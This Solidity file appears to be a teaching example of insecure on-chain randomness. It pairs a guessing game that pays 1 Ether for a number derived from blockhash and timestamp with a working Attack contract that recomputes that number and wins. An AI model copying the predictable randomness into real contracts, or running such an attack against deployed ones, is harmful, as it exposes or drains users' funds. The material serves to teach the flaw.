// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./console.sol";

/*
NOTE: cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/

/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let's see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Ether

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/

contract GuessTheRandomNumber {
    constructor() payable {
        console.log("GuessTheRandomNumber.constructor() called");
    }

    function guess(uint256 _guess) public {
        console.log("GuessTheRandomNumber.guess() with %d", _guess);
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        console.log("GuessTheRandomNumber.guess() answer is %d", answer);
        if (_guess == answer) {
            console.log(
                "GuessTheRandomNumber.guess(), _guess==answer, sending 1 ether"
            );
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {
        console.log("Attack.receive() called");
    }

    // fallback() external payable {
    //     console.log("Attack.fallback() called");
    // }

    function attack(GuessTheRandomNumber guessTheRandomNumber) public payable {
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        console.log("Attack.attack(), answer is %d", answer);
        console.log("Attack.attack(), call guessTheRandomNumber.guess(answer)");
        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}